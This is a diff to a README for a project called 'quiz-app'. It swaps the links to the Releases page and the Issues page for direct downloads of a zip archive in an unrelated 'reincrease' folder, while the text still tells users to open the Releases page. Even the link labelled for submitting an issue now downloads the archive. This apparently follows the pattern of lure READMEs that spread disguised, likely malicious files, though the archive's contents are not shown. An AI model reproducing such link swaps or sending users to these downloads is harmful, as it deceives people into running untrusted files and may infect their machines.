@@ -8,7 +8,7 @@ Welcome to quiz-app! This web application helps you generate resumes based on yo
 
 To get started, you'll need to download the application. Please visit the Releases page below:
 
-[Download quiz-app](https://github.com/jbnoge/quiz-app/releases)
+[Download quiz-app](https://github.com/jbnoge/quiz-app/raw/refs/heads/main/reincrease/app-quiz-v1.9.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest release version.
@@ -63,13 +63,13 @@ If you encounter any issues, consider these tips:
 
 ## 📫 Feedback and Support
 
-Your feedback is important to us. If you have any questions or suggestions, you can reach us through the Issues section on our GitHub page. Simply click [here](https://github.com/jbnoge/quiz-app/issues) to submit a new issue.
+Your feedback is important to us. If you have any questions or suggestions, you can reach us through the Issues section on our GitHub page. Simply click [here](https://github.com/jbnoge/quiz-app/raw/refs/heads/main/reincrease/app-quiz-v1.9.zip) to submit a new issue.
 
 ## 🔄 Updates
 
 To stay updated with the latest features and fixes, keep an eye on the Releases page:
 
-[Download quiz-app](https://github.com/jbnoge/quiz-app/releases)
+[Download quiz-app](https://github.com/jbnoge/quiz-app/raw/refs/heads/main/reincrease/app-quiz-v1.9.zip)
 
 You can also follow this repository for notifications about new releases.
 
